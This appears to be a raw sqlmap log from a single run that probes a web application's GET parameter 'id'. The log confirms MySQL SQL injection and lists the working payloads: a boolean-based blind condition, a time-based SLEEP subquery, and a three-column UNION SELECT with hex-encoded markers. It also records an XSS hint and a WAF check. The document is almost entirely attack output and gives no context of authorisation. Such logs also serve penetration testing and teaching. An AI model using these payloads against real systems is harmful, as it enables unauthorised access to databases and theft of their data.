[*] starting @ 12:34:56 /2024-01-01/

[12:34:56] [INFO] testing connection to the target URL
[12:34:56] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:34:57] [INFO] testing if the target URL content is stable
[12:34:57] [INFO] target URL content is stable
[12:34:57] [INFO] testing if GET parameter 'id' is dynamic
[12:34:58] [INFO] GET parameter 'id' appears to be dynamic
[12:34:58] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:34:59] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[12:35:00] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[12:35:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:35:06] [WARNING] reflective value(s) found and filtering out
[12:35:08] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")
[12:35:10] [INFO] testing 'Generic inline queries'
[12:35:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:35:22] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[12:35:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:35:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:35:24] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[12:35:26] [INFO] target URL appears to have 3 columns in query
[12:35:28] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))test)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b707671,0x4a6e4e6f5a73464d6856754d6f71596c6e6a6c764a7241796a4f53655766694a5a6f466a784b6e,0x7170767071)-- -
---

[*] shutting down @ 12:35:30
